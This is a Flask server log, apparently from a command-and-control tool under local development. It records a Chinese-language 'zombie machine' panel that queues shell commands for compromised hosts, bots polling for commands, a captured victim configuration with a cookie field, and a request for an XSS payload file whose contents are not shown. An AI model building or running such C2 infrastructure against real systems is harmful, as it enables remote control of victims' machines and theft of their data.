</div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T15:37:45.696Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:37:45.700292</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:47:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:18] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:47:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:18] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:47:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:18] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:47:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:25 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:47:25 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:47:25 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:47:25 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:47:25 | INFO     | app.py:184 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:47:25 | INFO     | app.py:184 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:47:25 | INFO     | app.py:194 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:47:25 | INFO     | app.py:194 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:47:25 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 23:47:29 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 23:47:29 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 23:47:29 | INFO     | app.py:197 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:47:29 | INFO     | app.py:197 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:47:29 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:47:29 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:47:29 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:47:29 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:47:29 | INFO     | app.py:184 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:47:29 | INFO     | app.py:184 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:47:29 | INFO     | app.py:194 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:47:29 | INFO     | app.py:194 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:47:29 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 23:47:29 | INFO     | app.py:197 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:47:29 | INFO     | app.py:197 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:52:17 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:52:17 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:52:17 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:52:17 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:52:17 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:52:17 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:52:17 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:52:17 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:52:17 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 23:52:17 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:52:17 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:52:17 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:52:17 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:52:17 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:52:17 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:52:17 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:52:17 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:52:17 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:52:17 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:52:17 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 23:52:17 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:52:17 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:53:08 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:53:08 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:53:08 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:53:08 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:53:08 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:53:08 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:53:08 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:53:08 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:53:08 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 23:53:08 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:53:08 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:53:09 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:53:09 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:53:09 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:53:09 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:53:09 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:53:09 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:53:09 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:53:09 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:53:09 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 23:53:09 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:53:09 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:03:30 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:03:30 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:03:30 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:03:30 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:03:30 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:03:30 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:03:30 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:03:30 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:03:30 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:03:30 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:03:30 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:03:30 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:03:30 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:03:30 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:03:30 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:03:30 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:03:30 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:03:30 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:03:30 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:03:30 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:03:30 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:03:30 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:03:30 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-25 00:03:30 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-25 00:03:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 00:03:37 | INFO     | control_route.py:74 | get_messages() | 用戶請求獲取消息
2025-06-25 00:03:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0299s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 00:03:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:37] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 00:03:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:37] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-25 00:03:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:37] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:03:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:03:40 | INFO     | control_route.py:128 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:03:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0004s) -> 回傳: <Response 2102 bytes [200 OK]>
